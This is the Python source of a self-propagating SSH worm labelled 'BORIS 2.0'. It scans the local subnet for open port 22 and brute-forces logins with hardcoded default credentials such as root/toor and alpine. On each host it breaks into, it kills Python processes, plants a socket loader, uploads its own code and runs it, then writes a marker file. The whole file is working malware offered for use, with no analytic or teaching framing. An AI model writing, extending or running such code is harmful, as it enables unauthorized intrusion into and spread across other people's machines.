VERSION=2.0
#BORIS 2.0
import os

def payload():
    print("Hacked!")
    os.system("echo hacked > hacked.txt")   
if 0 != os.system("which pip"): # get pip
    os.system("curl https://bootstrap.pypa.io/get-pip.py -o get-pip.py")
    os.system("wget https://bootstrap.pypa.io/get-pip.py")
    os.system("python get-pip.py --user")
    os.system("python get-pip.py")
try:
    from threading import *
except:
    os.system("pip install threading")
    import threading
try:
    from queue import *
except:
    from Queue import *
try:
    import paramiko
except:
    os.system("pip install paramiko")
    try:
        import paramiko
    except:
        payload()
        exit("Adios!")
import sys
import socket
import time as t
from subprocess import check_output,Popen
try:
    from subprocess import pipe
except:
    from subprocess import PIPE as pipe
import random

def getips():
    addrs = []
    addrs.append([l for l in ([ip for ip in socket.gethostbyname_ex(socket.gethostname())[2] if not ip.startswith("127.")][:1], [[(s.connect(("8.8.8.8", 53)), s.getsockname()[0], s.close()) for s in [socket.socket(socket.AF_INET, socket.SOCK_DGRAM)]][0][1]]) if l][0][0])
    return addrs

homeips = []
for i in getips():
    homeips.append(i)

subnet = []
for ip in getips():
    ip = ip.split(".")[:3]
    ip = ip[0]+"."+ip[1]+"."+ip[2]+"."
    for i in range(1,256):
        if str(ip+str(i)) in homeips:
            continue
        subnet.append(str(ip+str(i)))
ips = Queue()
hackable = Queue()
random.shuffle(subnet)
for ip in subnet[:]:
    ips.put(ip)
del subnet

class scanner(Thread):
    def __init__(self,ips,hackable):
        Thread.__init__(self)

        self.ips = ips
        self.hackable = hackable
        
        self.start()

    def run(self):
        while not self.ips.empty():
            ip = self.ips.get()
            connect = socket.socket()
            connect.settimeout(1)
            result = connect.connect_ex((ip,22))
            if result == 0:
                self.hackable.put(ip)
                continue
            self.ips.task_done()

class hacker(Thread):
    def __init__(self,ips):
        Thread.__init__(self)

        self.ips = ips

        self.start()

    def run(self):
        while not self.ips.empty():
            ip = self.ips.get()
            usernames = ["admin","root","guest","user"]
            passwords = ["system10","toor","admin","guest","password","root","letmein","12345678","alpine"]
            ag = 0
            done = "E"+"O"+"F"
            loader = "import socket\n"
            loader += "s = socket.socket()\n"
            loader += "s.bind((\"0.0.0.0\",3695))\n"
            loader += "s.listen(5)\n"
            loader += "c,a = s.accept()\n"
            loader += "while True:\n"
            loader += "    f = open(\"worm.py\",\"ab\")\n"
            loader += "    data = c.recv(4096)\n"
            loader += "    if data.strip(\"\\r\").strip(\"\\n\")!=\"E\"+\"O\"+\"F\":\n"
            loader += "        f.write(data)\n"
            loader += "    else:\n"
            loader += "        f.close()\n"
            loader += "        s.close()\n"
            loader += "        break\n"
            loader += "f.close()\n"
            for password in passwords:
                for username in usernames:
                    ssh = paramiko.SSHClient()
                    ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
                    try:
                        ssh.connect(ip,port=22,username=username,password=password,timeout=3)
                    except:
                        ssh.close()
                        continue
                    ag = 1 
                    print("{}\n[ACCESS GRANTED]".format(ip))
                    ssh.invoke_shell()
                    ssh.exec_command("sh")
                    f = open(sys.argv[0],"rb")
                    contents = f.read()
                    f.close()
                    a,b,c = ssh.exec_command("ls")
                    if sys.argv[0] in b.read():
                        a,b,c = ssh.exec_command("cat "+sys.argv[0])
                        try:
                            version = b.readline(1).split("=")[1]
                            if version > VERSION:
                                #They have a better version!
                                pass #todo
                            elif version == version:
                                print("Target is already infected with latest version. Retriggering...")
                                if sys.argv[0][:-3]==".py":
                                    ssh.exec_command("python worm.py")
                                else:
                                    ssh.exec_command("./"+sys.argv[0])
                                break
                            else:
                                pass
                        except:
                            pass #Guess they're not a worm after all 
                    a,b,c = ssh.exec_command("rm loader.py & touch loader.py")
                    b.readlines()
                    a,b,c = ssh.exec_command("pkill python")
                    t.sleep(0.5)
                    for line in loader.splitlines():
                        string = "echo \'{}\' >> loader.py".format(line)
                        a,b,c = ssh.exec_command(string)
                        b.readlines()
                    a,b,c = ssh.exec_command("python loader.py")
                    t.sleep(1)
                    s = socket.socket()
                    s.connect((ip,3695))
                    print("Uploading virus")
                    for line in contents.splitlines():
                        s.send(line+"\n")
                        t.sleep(0.25)
                    s.send(done)
                    s.close()
                    t.sleep(1)
                    ssh.exec_command("python worm.py")

                    break
                if ag==1:
                    break
            if ag==1:
                break

for i in range(30):
    scanner(ips,hackable)

while not ips.empty():
    pass

for i in range(10):
    hacker(hackable)
payload()
